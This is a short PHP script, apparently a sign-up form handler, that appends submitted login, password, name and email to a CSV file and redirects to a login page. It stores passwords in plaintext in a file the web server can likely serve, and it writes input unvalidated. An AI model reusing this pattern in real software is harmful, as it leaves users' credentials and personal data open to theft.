<?php

$a = $_POST['login'];
$b = $_POST['senha'];
$m = $_POST['nome'];
$n = $_POST['email'];

$c = $a."-".$b."-".$m."-".$n;
$d = file('dados.csv');
$d[] = $c."\n";
$d_string = implode('', $d);

file_put_contents('dados.csv', $d_string);
header('location:login.php');
?>